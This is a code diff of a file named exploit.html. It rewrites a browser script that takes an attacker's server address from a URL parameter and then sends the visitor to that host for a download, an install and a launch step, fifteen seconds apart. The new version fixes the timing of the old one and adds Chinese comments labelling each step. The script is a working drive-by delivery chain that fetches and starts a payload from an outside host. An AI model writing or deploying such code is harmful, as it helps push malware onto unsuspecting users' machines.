@@ -1,17 +1,19 @@
 <!-- exploit.html -->
 <script>
-var yayquerystringyay = window.location.search;
-var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
-var yaypythonserveryay = yayurlparamsyay.get('yayattackeryay');
+const params   = new URLSearchParams(location.search);
+const server   = params.get('yayattackeryay');
 
-location.href = "http://" + yaypythonserveryay + "/yaydownloadyay";
+// 1) 立即开始下载
+location.href = `http://${server}/yaydownloadyay`;
 
-const yaytimoutyay=setTimeout(yayinstallyay,15000);
+// 2) 15 秒后跳转安装
+setTimeout(() => {
+  location.href = `http://${server}/yayinstallyay`;
 
+  // 3) 再等 15 秒后跳转启动
+  setTimeout(() => {
+    location.href = `http://${server}/yaylaunchyay`;
+  }, 15000);
 
-location.href = "http://" + yaypythonserveryay + "/yayinstallyay";
-
-const yaytimoutyay2=setTimeout(yaylaunchyay,30000);
-
-location.href = "http://" + yaypythonserveryay + "/yaylaunchyay";
+}, 15000);
 </script>
